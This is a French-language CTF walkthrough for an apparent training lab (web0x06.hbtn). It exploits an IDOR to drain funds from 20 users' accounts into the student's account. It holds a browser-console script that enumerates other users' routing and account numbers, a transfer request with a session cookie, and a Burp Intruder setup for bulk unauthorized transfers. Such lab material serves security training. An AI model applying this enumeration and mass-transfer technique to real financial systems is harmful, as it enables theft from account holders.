# Guide Burp Intruder - Task 2 IDOR Exploitation

## 🎯 Objectif
Automatiser les transferts depuis 20 comptes pour atteindre $10,000+

## 📋 Étape 1 : Récupérer les détails des comptes

### Comptes à exploiter (from users.txt)
Chaque user a 2 comptes. Total = 20 comptes.

```
Linda Robinson     : 8d06b28a94b2467ebc0018dcfc09b5e9, 4a5faef8ae164f31846afa10370685e0
Patricia Garcia    : 1194d75871504ffeb175c8d2c8e2f42f, ab52b13bae824c25b63a26c433670d4a
Elizabeth Martin   : f45b72739e334535bef8ab28ae9f1523, bec3a9b1d0d24d04ba01301d03dee8be
Megan White        : 4eee579188954d0b9f9d1134a643179a, 7c1464f7af334bbfa45cf399d7ebd5f6
Ashley Thomas      : d12096acb6804f008ce6d7695f74634b, 3fee1a3ca97e46889762a744f05042f9
Robert Martinez    : 8e499f7db82e4013863a5cdc501380fb, 6e1a9f2e2aeb4eaba6614ab588fb24a4
James Thompson     : 59bec397ea104be6ac9fec6ce00320c6, 330e0c2932b649d7889bb6144288f3ff
Brian Harris       : f4cb57a8bba04ac48185b388207a2013, c9151e99d7d74d53999eebe1d4bb8ada
Mark Jackson       : 7b826152e634412f943d271e170dbd33, 53a6974ae19d4b0dbd56de7c6d4cd454
David Anderson     : ece4c75ce2774fdf8a7646afa6b59a74, 30fd0a2df7554eb1aefb26205ff9d5f1
```

### Méthode pour récupérer routing + number

#### Option A : Via DevTools Console (RAPIDE)
```javascript
// Dans la console du navigateur
const accounts = [
  "8d06b28a94b2467ebc0018dcfc09b5e9",
  "4a5faef8ae164f31846afa10370685e0",
  "1194d75871504ffeb175c8d2c8e2f42f",
  "ab52b13bae824c25b63a26c433670d4a",
  "f45b72739e334535bef8ab28ae9f1523",
  "bec3a9b1d0d24d04ba01301d03dee8be",
  "4eee579188954d0b9f9d1134a643179a",
  "7c1464f7af334bbfa45cf399d7ebd5f6",
  "d12096acb6804f008ce6d7695f74634b",
  "3fee1a3ca97e46889762a744f05042f9",
  "8e499f7db82e4013863a5cdc501380fb",
  "6e1a9f2e2aeb4eaba6614ab588fb24a4",
  "59bec397ea104be6ac9fec6ce00320c6",
  "330e0c2932b649d7889bb6144288f3ff",
  "f4cb57a8bba04ac48185b388207a2013",
  "c9151e99d7d74d53999eebe1d4bb8ada",
  "7b826152e634412f943d271e170dbd33",
  "53a6974ae19d4b0dbd56de7c6d4cd454",
  "ece4c75ce2774fdf8a7646afa6b59a74",
  "30fd0a2df7554eb1aefb26205ff9d5f1"
];

// Fonction pour récupérer les infos
async function fetchAllAccounts() {
  const results = [];
  
  for (const accountId of accounts) {
    try {
      const response = await fetch(`/api/accounts/info/${accountId}`);
      const data = await response.json();
      
      results.push({
        account_id: accountId,
        routing: data.routing,
        number: data.number,
        balance: data.balance,
        owner: data.owner
      });
      
      console.log(`✅ ${data.owner}: $${data.balance}`);
    } catch (error) {
      console.log(`❌ Erreur pour ${accountId}`);
    }
  }
  
  return results;
}

// Exécuter et afficher
const accountsData = await fetchAllAccounts();

// Afficher les listes pour Burp
console.log("\n=== ACCOUNT_ID LIST ===");
accountsData.forEach(a => console.log(a.account_id));

console.log("\n=== ROUTING LIST ===");
accountsData.forEach(a => console.log(a.routing));

console.log("\n=== NUMBER LIST ===");
accountsData.forEach(a => console.log(a.number));

console.log("\n=== JSON COMPLET ===");
console.log(JSON.stringify(accountsData, null, 2));
```

#### Option B : Via Burp Repeater (MANUEL)
1. Envoie `GET /api/accounts/info/{account_id}` dans Repeater
2. Copie routing + number de la réponse
3. Répète pour les 20 comptes

## 🔫 Étape 2 : Configurer Burp Intruder

### 1. Capturer une requête de transfert
```http
POST /api/accounts/transfer_to/c962c1e9ca0246ca82e945a40f119572 HTTP/1.1
Host: web0x06.hbtn
Content-Type: application/json
Cookie: session=iJ9ikFRzwzc1b9sEakXNSJ13tOr68db3uEF5rlI6Vcw.xxYUvubh_Sq8jDg3P_Yx3P7mNyI

{"amount":500,"raison":"transfert","account_id":"ATTAQUE_ICI","routing":"ATTAQUE_ICI","number":"ATTAQUE_ICI"}
```

### 2. Envoyer vers Intruder (Ctrl+I)

### 3. Onglet Positions
- **Attack type**: `Pitchfork` (synchronise les payloads)
- **Positions à marquer**:
```json
{"amount":500,"raison":"transfert","account_id":"§POSITION1§","routing":"§POSITION2§","number":"§POSITION3§"}
```

### 4. Onglet Payloads

#### Payload Set 1 (account_id)
```
[coller ici tous les account_id ligne par ligne]
```

#### Payload Set 2 (routing)
```
[coller ici tous les routing ligne par ligne]
```

#### Payload Set 3 (number)
```
[coller ici tous les number ligne par ligne]
```

**⚠️ IMPORTANT** : L'ordre doit correspondre ! 
- Ligne 1 de payload 1 = ligne 1 de payload 2 = ligne 1 de payload 3

### 5. Onglet Options (optionnel)
- **Threads**: 1 (éviter rate limiting)
- **Grep - Match**: Ajouter `"status":"success"` pour identifier les succès

### 6. Start Attack 🚀

## 📊 Étape 3 : Analyser les résultats

### Dans Burp Intruder Results
- Filtrer par Status Code = 200
- Chercher `"status":"success"` dans Response
- Vérifier le nombre de transferts réussis

### Vérifier le solde final
```http
GET /api/customer/info/me HTTP/1.1
```

Regarder `total_balance` dans la réponse.

### Trouver le flag
Quand balance > $10,000 :
1. Le flag peut apparaître dans la dernière réponse de transfert
2. Ou dans `GET /api/customer/info/me`
3. Ou sur le dashboard web

## 💡 Tips

### Si certains transferts échouent
- Vérifie que routing/number correspondent au bon account_id
- Certains comptes ont peut-être balance = 0
- Vérifie le message d'erreur dans Response

### Si besoin de plus de $$$
- Tu peux faire plusieurs transferts par compte
- Change `"amount":500` en `"amount":1000` dans Intruder

### Optimisation
- Tu peux d'abord tester avec 2-3 comptes
- Une fois validé, lancer l'attaque complète sur les 20

## 🎯 Résumé

1. **Récupérer les données** : Via console JS (rapide) ou Burp Repeater (pédagogique)
2. **Configurer Intruder** : Pitchfork avec 3 payload sets synchronisés
3. **Lancer l'attaque** : 20 requêtes = 20 transferts
4. **Vérifier le solde** : Atteindre $10k+
5. **Récupérer le flag** : Dans la réponse ou sur le dashboard

## 📝 Note
Ton TON compte destination : `c962c1e9ca0246ca82e945a40f119572`
